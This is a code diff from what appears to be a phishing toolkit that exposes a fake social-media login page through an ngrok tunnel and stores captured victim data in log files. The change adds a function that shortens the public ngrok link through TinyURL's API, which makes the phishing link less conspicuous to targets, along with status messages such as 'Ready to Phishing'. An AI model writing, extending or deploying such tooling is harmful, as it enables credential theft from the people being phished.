@@ -22,7 +22,11 @@ from core.email import send_mail
 from core.credentials import credentials
 from smtplib import SMTPSenderRefused, SMTPServerDisconnected
 from time import strftime
-    
+
+def getTinyURL(url):    
+    data = get('http://tinyurl.com/api-create.php?url=' + url)
+    return data.text
+
 def runPhishing(social, custom):
     global _social
     _social = social
@@ -77,8 +81,10 @@ def ngrok_start(port: int):
             ngrok_url = requests.get('http://127.0.0.1:4040/api/tunnels/command_line')
             if ngrok_url.status_code == 200:
                 public_url = json.loads(ngrok_url.text)['public_url']
-                print(lightgreen('\n [*] Ngrok URL: %s' % public_url))
-                print(green(' [*] Your logs are being stored in: Logs/{}').format(_social + strftime('-%y%m%d.txt')))
+                print(green(' [~] Ready to Phishing'))
+                print(lightgreen(' [*] Ngrok URL: %s' % public_url))
+                print(lightgreen(' [*] Tiny URL: %s' % getTinyURL(public_url)))
+                print(green(' [~] Your logs are being stored in: Logs/{}').format(_social + strftime('-%y%m%d.txt')))
                 print(yellow(' [^] Press Ctrl+C or VolDown+C(android) to quit'))
                 yield public_url
                 break
